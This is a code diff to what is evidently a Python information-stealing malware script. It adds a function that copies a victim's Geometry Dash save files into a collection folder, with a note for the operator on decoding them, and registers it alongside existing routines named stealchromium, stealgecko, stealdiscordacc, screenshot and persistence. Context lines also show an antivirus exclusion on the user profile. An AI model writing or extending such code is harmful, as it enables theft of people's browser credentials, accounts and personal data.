@@ -735,7 +735,26 @@ def makepath():
     except:
         return None
 
-
+def collectgeometrydash():
+    if config.games:
+        gdpath = os.path.join(os.getenv('localappdata'), 'GeometryDash', 'CCGameManager.dat')
+        gdlevelpath = os.path.join(os.getenv('localappdata'), 'GeometryDash', 'CCLocalLevels.dat')
+        gdoutput = os.path.join(output, 'Geometry Dash')
+        if os.path.exists(gdpath):
+            try:
+                shutil.copy2(gdpath, os.path.join(gdoutput, os.path.basename(gdpath)))
+                gd_session = 1
+            except:
+                pass
+        if os.path.exists(gdlevelpath):
+            try:
+                shutil.copy2(gdlevelpath, os.path.join(gdoutput, os.path.basename(gdlevelpath)))
+            except:
+                pass
+        try:
+            write(os.path.join(gdoutput, 'note.txt'), 'I recommend using https://gdcolon.com/gdsave/ if you wanna get data from the save files, otherwise just replace your geometry dash save files with the one shown here')
+        except:
+            pass
 
 def collectsteam():
     if config.games:
@@ -766,7 +785,7 @@ exclusion(os.getenv('userprofile'))
 
 kill()
 persistence(copypath)
-funcs = [systeminfo, screenshot, stealchromium, stealgecko, stealdiscordacc, collectminecraft, collectsteam]
+funcs = [systeminfo, screenshot, stealchromium, stealgecko, stealdiscordacc, collectminecraft, collectgeometrydash, collectsteam]
 # systeminfo()
 # screenshot()
 # kill()
